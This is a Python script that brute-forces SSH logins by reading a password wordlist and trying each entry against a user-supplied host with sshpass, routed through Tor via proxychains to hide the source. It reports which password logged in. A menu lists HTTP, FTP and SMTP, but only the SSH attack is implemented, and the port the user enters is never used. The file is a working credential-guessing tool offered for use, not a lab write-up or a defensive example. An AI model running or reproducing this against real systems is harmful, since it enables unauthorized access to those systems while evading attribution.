import os
import time
import sys
import subprocess

def wccount(filename):
    out = subprocess.Popen(['wc', '-l', filename],
                         stdout=subprocess.PIPE,
                         stderr=subprocess.STDOUT
                         ).communicate()[0]
    return int(out.partition(b' ')[0])

def create_traffic_ssh():
        ip = input("Enter the IP: ")
        port = input("Enter the port: ")
        username = input("Enter the username: ")
        password = input("Enter the password file: ")
        try:
                f = open(password)
        except Exception as e:
                print(e)
                sys.exit(1)
        try:
                os.system('service tor restart')
                print('[*] Tor is ready!')
        except Exception as e:
                print(e)
        
        traffic_count = wccount(password)
        print("[*] Found "+ traffic_count.__str__() +" passwords...")
        print("[*] It will take approximately " + (traffic_count * 5).__str__() + " seconds...")
        time.sleep(2)
        for line in f:                      
                cmd = "proxychains -q sshpass -p '"+line+"' ssh "+username+"@"+ip+" 'pwd' || echo 'error'" 
                result = subprocess.check_output(cmd, shell=True)

                temp = result.decode("utf-8")

                if not (temp.__contains__("error")):
                        print("Login succesfull with user: "+username+" and password: "+line)
                else:
                        print("Login failed with user: "+username+" and password: "+line)
                time.sleep(2)


def mainmenu():        
        print("[1] SSH")
        print("[2] HTTP")
        print("[3] FTP")
        print("[4] SMTP")
        user_input = input("Enter the number of the protocol: ")
        while (user_input != "1" and user_input != "2" and user_input != "3" and user_input != "4"):
                user_input = input("Enter the number of the protocol: ")

        if(user_input == "1"):
                create_traffic_ssh()

if __name__ == '__main__':
        mainmenu()
        

